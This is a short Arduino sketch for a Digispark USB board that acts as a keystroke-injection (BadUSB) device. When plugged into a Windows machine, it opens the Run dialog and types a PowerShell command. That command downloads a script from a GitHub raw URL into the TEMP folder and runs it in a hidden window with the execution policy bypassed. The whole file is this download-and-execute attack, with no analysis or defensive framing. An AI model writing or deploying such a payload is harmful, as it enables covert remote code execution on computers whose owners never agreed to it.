#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -Command \"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/NicolaLepore4/Digi-sounds/main/script.sh', \"$env:TEMP\\script.ps1\"); Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File', \"$env:TEMP\\script.ps1\" -WindowStyle Hidden\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
